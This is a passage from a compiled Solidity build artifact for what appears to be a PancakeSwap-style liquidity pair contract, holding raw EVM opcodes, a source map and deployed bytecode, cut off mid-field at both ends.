MSTORE 0x4E GASLIMIT DIFFICULTY 0xDD CALLCODE MSTORE 0xAD SHL 0xE2 0xC8 SWAP12 PUSH10 0xC2B068FC378DAA952BA7 CALL PUSH4 0xC4A11628 CREATE2 GAS 0x4D CREATE2 0x23 0xB3 0xEF POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4F SSTORE SLOAD POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY LOG2 PUSH6 0x627A7A723158 KECCAK256 STATICCALL 0x4B CALLDATASIZE SHR 0xDD PUSH14 0xAA0DA2A7850E0455536877912409 SDIV 0xA8 EXTCODECOPY CODECOPY 0xDD SSTORE PUSH2 0x6799 DUP15 PUSH23 0x8B64736F6C63430005100032454950373132446F6D6169 PUSH15 0x28737472696E67206E616D652C7374 PUSH19 0x696E672076657273696F6E2C75696E74323536 KECCAK256 PUSH4 0x6861696E 0x49 PUSH5 0x2C61646472 PUSH6 0x737320766572 PUSH10 0x6679696E67436F6E7472 PUSH2 0x6374 0x29 ",
							"sourceMap": "318:18193:1:-;;;438:70;;;-1:-1:-1;;;;;;438:70:1;466:42;438:70;;;;1227:25;;2471:58;5:2:-1;;;;30:1;27;20:12;5:2;-1:-1;1245:133:0;;1149:7;;1245:133;;;;;;;;;;;;;;;;1412:4;;;;;;;;;-1:-1:-1;;;1412:4:0;;;;;1446:10;;;;;;;;;;-1:-1:-1;;;1446:10:0;;;;1217:310;;;;;;;;;1396:22;1217:310;;;;1436:21;1217:310;;;;;;;;;;;1508:4;1217:310;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;1217:310:0;;;;;;;1194:343;;;;;1175:16;:362;-1:-1:-1;2502:20:1;;-1:-1:-1;;;;;;2502:20:1;2512:10;2502:20;;;318:18193;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106101e55760003560e01c806370a082311161010f578063bc25cf77116100a2578063dcbbb37311610071578063dcbbb373146105ff578063dd62ed3e14610625578063f317739c14610653578063fff6cae91461065b576101e5565b8063bc25cf7714610578578063c45a01551461059e578063d21220a7146105a6578063d505accf146105ae576101e5565b8063900820d8116100de578063900820d81461053457806395d89b411461053c578063a9059cbb14610544578063ba9a7a5614610570576101e5565b806370a08231146104a15780637464fc3d146104c75780637ecebe00146104cf57806389afcb44146104f5576101e5565b806323b872dd1161018757806347d5d8561161015657806347d5d856146104455780635909c0d51461046b5780635a3d5493146104735780636a6278421461047b576101e5565b806323b872dd146103e157806330adf81f14610417578063313ce5671461041f5780633644e5151461043d576101e5565b8063095ea7b3116101c3578063095ea7b31461032d5780630dfe16811461036d5780631794bb3c1461039157806318160ddd146103c7576101e5565b8063022c0d9f146101ea57806306fdde03146102785780630902f1ac146102f5575b600080fd5b6102766004803603608081101561020057600080fd5b8135916020810135916001600160a01b03604083013516919081019060808101606082013564010000000081111561023757600080fd5b82018360208201111561024957600080fd5b8035906020019184600183028401116401000000008311171561026b57600080fd5b509092509050610663565b005b610280610c17565b6040805160208082528351818301528351919283929083019185019080838360005b838110156102ba5781810151838201526020016102a2565b50505050905090810190601f1680156102e75780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102fd610c3a565b604080516001600160701b03948516815292909316602083015263ffffffff168183015290519081900360600190f35b6103596004803603604081101561034357600080fd5b506001600160a01b038135169060200135610c64565b604080519115158252519081900360200190f35b610375610c7b565b604080516001600160a01b039092168252519081900360200190f35b610276600480360360608110156103a757600080fd5b506001600160a01b03813581169160208101359091169060400135610c8a565b6103cf610d13565b60408051918252519081900360200190f35b610359600480360360608110156103f757600080fd5b506001600160a01b03813581169160208101359091169060400135610d19565b6103cf610db3565b610427610dd7565b6040805160ff9092168252519081900360200190f35b6103cf610ddc565b6103cf6004803603602081101561045b57600080fd5b50356001600160a01b0316610de2565b6103cf610df4565b6103cf610dfa565b6103cf6004803603602081101561049157600080fd5b50356001600160a01b0316610e00565b6103cf600480360360208110156104b757600080fd5b50356001600160a01b03166110fe565b6103cf611110565b6103cf600480360360208110156104e557600080fd5b50356001600160a01b0316611116565b61051b6004803603602081101561050b57600080fd5b50356001600160a01b0316611128565b6040805192835260208301919091528051918290030190f35b6103756114cc565b6102806114db565b6103596004803603604081101561055a57600080fd5b506001600160a01b0381351690602001356114fd565b6103cf61150a565b6102766004803603602081101561058e57600080fd5b50356001600160a01b0316611510565b610375611679565b610375611688565b610276600480360360e08110156105c457600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135611697565b6103cf6004803603602081101561061557600080fd5b50356001600160a01b0316611897565b6103cf6004803603604081101561063b57600080fd5b506001600160a01b0381358116916020013516611ae6565b6103cf611b03565b610276611b09565b600f546001146106ac576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55841515806106bf5750600084115b6106fa5760405162461bcd60e51b815260040180806020018281038252602381526020018061266d6023913960400191505060405180910390fd5b600080610705610c3a565b5091509150816001600160701b03168710801561072a5750806001600160701b031686105b61077b576040805162461bcd60e51b815260206004820152601f60248201527f50616e63616b653a20494e53554646494349454e545f4c495155494449545900604482015290519081900360640190fd5b60008080606460058b02048a0390506000606460058b02600854600954929091048c0392506001600160a01b03908116918116908b1682148015906107d25750806001600160a01b03168b6001600160a01b031614155b610819576040805162461bcd60e51b815260206004820152601360248201527250616e63616b653a20494e56414c49445f544f60681b604482015290519081900360640190fd5b8c1561082a5761082a828c86611c69565b8b1561083b5761083b818c85611c69565b88156108f6578a6001600160a01b031663848008123386868e8e6040518663ffffffff1660e01b815260040180866001600160a01b03166001600160a01b03168152602001858152602001848152602001806020018281038252848482818152602001925080828437600081840152601f19601f8201169050808301925050509650505050505050600060405180830381600087803b1580156108dd57600080fd5b505af11580156108f1573d6000803e3d6000fd5b505050505b606460058e810282900491908e02048e15610923576006546109239085906001600160a01b031684611c69565b8d15610941576006546109419084906001600160a01b031683611c69565b604080516370a0823160e01b815230600482015290516001600160a01b038616916370a08231916024808301926020929190829003018186803b15801561098757600080fd5b505afa15801561099b573d6000803e3d6000fd5b505050506040513d60208110156109b157600080fd5b5051604080516370a0823160e01b815230600482015290519199506001600160a01b038516916370a0823191602480820192602092909190829003018186803b1580156109fd57600080fd5b505afa158015610a11573d6000803e3d6000fd5b505050506040513d6020811015610a2757600080fd5b505196506000955050505050506001600160701b0385168a90038311610a4e576000610a5d565b89856001600160701b03160383035b9050600089856001600160701b0316038311610a7a576000610a89565b89856001600160701b03160383035b90506000821180610a9a5750600081115b610ad55760405162461bcd60e51b81526004018080602001828103825260228152602001806125dd6022913960400191505060405180910390fd5b6000610b09610aeb84601963ffffffff611e0316565b610afd8761271063ffffffff611e0316565b9063ffffffff611e6616565b90506000610b21610aeb84601963ffffffff611e0316565b9050610b536305f5e100610b476001600160701b038b8116908b1663ffffffff611e0316565b9063ffffffff611e0316565b610b63838363ffffffff611e0316565b1015610ba3576040805162461bcd60e51b815260206004820152600a60248201526950616e63616b653a204b60b01b604482015290519081900360640190fd5b5050610bb184848888611eb6565b60408051838152602081018390528082018d9052606081018c905290516001600160a01b038b169133917fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d8229181900360800190a350506001600f55505050505050505050565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b600b546001600160701b0380821692600160701b830490911691600160e01b900463ffffffff1690565b6000610c71338484612079565b5060015b92915050565b6008546001600160a01b031681565b6007546001600160a01b03163314610cde576040805162461bcd60e51b81526020600482015260126024820152712830b731b0b5b29d102327a92124a22222a760711b604482015290519081900360640190fd5b600880546001600160a01b039485166001600160a01b0319918216179091556009805493909416921691909117909155600a55565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610d9e576001600160a01b0384166000908152600260209081526040808320338452909152902054610d79908363ffffffff611e6616565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b610da98484846120db565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b600c5481565b600d5481565b6000600f54600114610e4b576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f81905580610e5b610c3a565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b158015610eaf57600080fd5b505afa158015610ec3573d6000803e3d6000fd5b505050506040513d6020811015610ed957600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015610f2c57600080fd5b505afa158015610f40573d6000803e3d6000fd5b505050506040513d6020811015610f5657600080fd5b505190506000610f75836001600160701b03871663ffffffff611e6616565b90506000610f92836001600160701b03871663ffffffff611e6616565b90506000610fa08787612183565b60005490915080610fdd57610fc96103e8610afd610fc4878763ffffffff611e0316565b6122f6565b9850610fd860006103e8612348565b61102c565b6110296001600160701b038916610ffa868463ffffffff611e0316565b8161100157fe5b046001600160701b03891661101c868563ffffffff611e0316565b8161102357fe5b046123cc565b98505b6000891161106b5760405162461bcd60e51b81526004018080602001828103825260268152602001806126906026913960400191505060405180910390fd5b6110758a8a612348565b61108186868a8a611eb6565b81156110b157600b546110ad906001600160701b0380821691600160701b90041663ffffffff611e0316565b600e555b6040805185815260208101859052815133927f4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f928290030190a250506001600f5550949695505050505050565b60016020526000908152604090205481565b600e5481565b60056020526000908152604090205481565b600080600f54600114611174576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f81905580611184610c3a565b50600854600954604080516370a0823160e01b815230600482015290519496509294506001600160a01b039182169391169160009184916370a08231916024808301926020929190829003018186803b1580156111e057600080fd5b505afa1580156111f4573d6000803e3d6000fd5b505050506040513d602081101561120a57600080fd5b5051604080516370a0823160e01b815230600482015290519192506000916001600160a01b038516916370a08231916024808301926020929190829003018186803b15801561125857600080fd5b505afa15801561126c573d6000803e3d6000fd5b505050506040513d602081101561128257600080fd5b5051306000908152600160205260408120549192506112a18888612183565b600054909150806112b8848763ffffffff611e0316565b816112bf57fe5b049a50806112d3848663ffffffff611e0316565b816112da57fe5b04995060008b1180156112ed575060008a115b6113285760405162461bcd60e51b81526004018080602001828103825260268152602001806126276026913960400191505060405180910390fd5b61133230846123e4565b61133d878d8d611c69565b611348868d8c611c69565b604080516370a0823160e01b815230600482015290516001600160a01b038916916370a08231916024808301926020929190829003018186803b15801561138e57600080fd5b505afa1580156113a2573d6000803e3d6000fd5b505050506040513d60208110156113b857600080fd5b5051604080516370a0823160e01b815230600482015290519196506001600160a01b038816916370a0823191602480820192602092909190829003018186803b15801561140457600080fd5b505afa158015611418573d6000803e3d6000fd5b505050506040513d602081101561142e57600080fd5b5051935061143e85858b8b611eb6565b811561146e57600b5461146a906001600160701b0380821691600160701b90041663ffffffff611e0316565b600e555b604080518c8152602081018c905281516001600160a01b038f169233927fdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496929081900390910190a35050505050505050506001600f81905550915091565b6006546001600160a01b031681565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b6000610c713384846120db565b6103e881565b600f54600114611559576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55600854600954600b54604080516370a0823160e01b815230600482015290516001600160a01b0394851694909316926116089285928792611603926001600160701b03169185916370a0823191602480820192602092909190829003018186803b1580156115cb57600080fd5b505afa1580156115df573d6000803e3d6000fd5b505050506040513d60208110156115f557600080fd5b50519063ffffffff611e6616565b611c69565b600b54604080516370a0823160e01b8152306004820152905161166f928492879261160392600160701b90046001600160701b0316916001600160a01b038616916370a0823191602480820192602092909190829003018186803b1580156115cb57600080fd5b50506001600f5550565b6007546001600160a01b031681565b6009546001600160a01b031681565b428410156116df576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa1580156117fa573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906118305750886001600160a01b0316816001600160a01b0316145b611881576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b61188c898989612079565b505050505050505050565b6000600f546001146118e2576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f819055806118f2610c3a565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b15801561194657600080fd5b505afa15801561195a573d6000803e3d6000fd5b505050506040513d602081101561197057600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b1580156119c357600080fd5b505afa1580156119d7573d6000803e3d6000fd5b505050506040513d60208110156119ed57600080fd5b505190506000611a0c836001600160701b03871663ffffffff611e6616565b90506000611a29836001600160701b03871663ffffffff611e6616565b90506000611a378787612183565b60005490915080611a7057611a5b6103e8610afd610fc4878763ffffffff611e0316565b9850611a6a60006103e8612470565b50611a90565b611a8d6001600160701b038916610ffa868463ffffffff611e0316565b98505b60008911611acf5760405162461bcd60e51b81526004018080602001828103825260288152602001806125ff6028913960400191505060405180910390fd5b611ad98a8a612470565b5061108186868a8a611eb6565b600260209081526000928352604080842090915290825290205481565b600a5481565b600f54600114611b52576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55600854604080516370a0823160e01b81523060048201529051611c62926001600160a01b0316916370a08231916024808301926020929190829003018186803b158015611ba357600080fd5b505afa158015611bb7573d6000803e3d6000fd5b505050506040513d6020811015611bcd57600080fd5b5051600954604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015611c1a57600080fd5b505afa158015611c2e573d6000803e3d6000fd5b505050506040513d6020811015611c4457600080fd5b5051600b546001600160701b0380821691600160701b900416611eb6565b6001600f55565b604080518082018252601981527f7472616e7366657228616464726573732c75696e74323536290000000000000060209182015281516001600160a01b0385811660248301526044808301869052845180840390910181526064909201845291810180516001600160e01b031663a9059cbb60e01b1781529251815160009460609489169392918291908083835b60208310611d165780518252601f199092019160209182019101611cf7565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114611d78576040519150601f19603f3d011682016040523d82523d6000602084013e611d7d565b606091505b5091509150818015611dab575080511580611dab5750808060200190516020811015611da857600080fd5b50515b611dfc576040805162461bcd60e51b815260206004820152601860248201527f50616e63616b653a205452414e534645525f4641494c45440000000000000000604482015290519081900360640190fd5b5050505050565b6000811580611e1e57505080820282828281611e1b57fe5b04145b610c75576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6d756c2d6f766572666c6f7760601b604482015290519081900360640190fd5b80820382811115610c75576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160701b038411801590611ed457506001600160701b038311155b611f19576040805162461bcd60e51b815260206004820152601160248201527050616e63616b653a204f564552464c4f5760781b604482015290519081900360640190fd5b600b5463ffffffff42811691600160e01b90048116820390811615801590611f4957506001600160701b03841615155b8015611f5d57506001600160701b03831615155b15611fce578063ffffffff16611f8b85611f7686612556565b6001600160e01b03169063ffffffff61256816565b600c80546001600160e01b03929092169290920201905563ffffffff8116611fb684611f7687612556565b600d80546001600160e01b0392909216929092020190555b600b80546dffffffffffffffffffffffffffff19166001600160701b03888116919091176dffffffffffffffffffffffffffff60701b1916600160701b8883168102919091176001600160e01b0316600160e01b63ffffffff871602179283905560408051848416815291909304909116602082015281517f1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1929181900390910190a1505050505050565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b038316600090815260016020526040902054612104908263ffffffff611e6616565b6001600160a01b038085166000908152600160205260408082209390935590841681522054612139908263ffffffff61258d16565b6001600160a01b03808416600081815260016020908152604091829020949094558051858152905191939287169260008051602061264d83398151915292918290030190a3505050565b600080600760009054906101000a90046001600160a01b03166001600160a01b031663017e7e586040518163ffffffff1660e01b815260040160206040518083038186803b1580156121d457600080fd5b505afa1580156121e8573d6000803e3d6000fd5b505050506040513d60208110156121fe57600080fd5b5051600e546001600160a01b0382161580159450919250906122e25780156122dd576000612241610fc46001600160701b0388811690881663ffffffff611e0316565b9050600061224e836122f6565b9050808211156122da5760006122816008610b47612272868663ffffffff611e6616565b6000549063ffffffff611e0316565b905060006122b661229984600863ffffffff611e0316565b6122aa86601163ffffffff611e0316565b9063ffffffff61258d16565b905060008183816122c357fe5b04905080156122d6576122d68782612348565b5050505b50505b6122ee565b80156122ee576000600e555b505092915050565b60006003821115612339575080600160028204015b818110156123335780915060028182858161232257fe5b04018161232b57fe5b04905061230b565b50612343565b8115612343575060015b919050565b60005461235b908263ffffffff61258d16565b60009081556001600160a01b038316815260016020526040902054612386908263ffffffff61258d16565b6001600160a01b038316600081815260016020908152604080832094909455835185815293519293919260008051602061264d8339815191529281900390910190a35050565b60008183106123db57816123dd565b825b9392505050565b6001600160a01b03821660009081526001602052604090205461240d908263ffffffff611e6616565b6001600160a01b0383166000908152600160205260408120919091555461243a908263ffffffff611e6616565b60009081556040805183815290516001600160a01b0385169160008051602061264d833981519152919081900360200190a35050565b60006001600160a01b0383166124cd576040805162461bcd60e51b815260206004820152601f60248201527f42455032303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b6000546124e0908363ffffffff61258d16565b60009081556001600160a01b03841681526003602052604090205461250b908363ffffffff61258d16565b6001600160a01b038416600081815260036020908152604080832094909455835186815293519293919260008051602061264d8339815191529281900390910190a350600192915050565b6001600160701b0316600160701b0290565b60006001600160701b0382166001600160e01b0384168161258557fe5b049392505050565b80820182811015610c75576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfe50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e54454450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e5450616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544a265627a7a72315820fa4b361cdd6daa0da2a7850e045553687791240905a83c39dd556167998e768b64736f6c63430005100032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1E5 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x10F JUMPI DUP1 PUSH4 0xBC25CF77 GT PUSH2 0xA2 JUMPI DUP1 PUSH4 0xDCBBB373 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0xDCBBB373 EQ PUSH2 0x5FF JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x625 JUMPI DUP1 PUSH4 0xF317739C EQ PUSH2 0x653 JUMPI DUP1 PUSH4 0xFFF6CAE9 EQ PUSH2 0x65B JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0xBC25CF77 EQ PUSH2 0x578 JUMPI DUP1 PUSH4 0xC45A0155 EQ PUSH2 0x59E JUMPI DUP1 PUSH4 0xD21220A7 EQ PUSH2 0x5A6 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x5AE JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x900820D8 GT PUSH2 0xDE JUMPI DUP1 PUSH4 0x900820D8 EQ PUSH2 0x534 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x53C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x544 JUMPI DUP1 PUSH4 0xBA9A7A56 EQ PUSH2 0x570 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x4A1 JUMPI DUP1 PUSH4 0x7464FC3D EQ PUSH2 0x4C7 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x4CF JUMPI DUP1 PUSH4 0x89AFCB44 EQ PUSH2 0x4F5 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0x187 JUMPI DUP1 PUSH4 0x47D5D856 GT PUSH2 0x156 JUMPI DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x445 JUMPI DUP1 PUSH4 0x5909C0D5 EQ PUSH2 0x46B JUMPI DUP1 PUSH4 0x5A3D5493 EQ PUSH2 0x473 JUMPI DUP1 PUSH4 0x6A627842 EQ PUSH2 0x47B JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD EQ PUSH2 0x3E1 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x417 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x41F JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x43D JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x95EA7B3 GT PUSH2 0x1C3 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x32D JUMPI DUP1 PUSH4 0xDFE1681 EQ PUSH2 0x36D JUMPI DUP1 PUSH4 0x1794BB3C EQ PUSH2 0x391 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x3C7 JUMPI PUSH2 0x1E5 JUMP JUMPDEST DUP1 PUSH4 0x22C0D9F EQ PUSH2 0x1EA JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x278 JUMPI DUP1 PUSH4 0x902F1AC EQ PUSH2 0x2F5 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x80 DUP2 LT ISZERO PUSH2 0x200 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH1 0x40 DUP4 ADD CALLDATALOAD AND SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH1 0x80 DUP2 ADD PUSH1 0x60 DUP3 ADD CALLDATALOAD PUSH5 0x100000000 DUP2 GT ISZERO PUSH2 0x237 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 ADD DUP4 PUSH1 0x20 DUP3 ADD GT ISZERO PUSH2 0x249 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP2 DUP5 PUSH1 0x1 DUP4 MUL DUP5 ADD GT PUSH5 0x100000000 DUP4 GT OR ISZERO PUSH2 0x26B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SWAP1 SWAP3 POP SWAP1 POP PUSH2 0x663 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x280 PUSH2 0xC17 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2BA JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x2A2 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x2E7 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2FD PUSH2 0xC3A JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP5 DUP6 AND DUP2 MSTORE SWAP3 SWAP1 SWAP4 AND PUSH1 0x20 DUP4 ADD MSTORE PUSH4 0xFFFFFFFF AND DUP2 DUP4 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 RETURN JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x343 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0xC64 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x375 PUSH2 0xC7B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xC8A JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xD13 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3F7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xD19 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDB3 JUMP JUMPDEST PUSH2 0x427 PUSH2 0xDD7 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x3CF PUSH2 0xDDC JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x45B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xDE2 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDF4 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDFA JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x491 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xE00 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 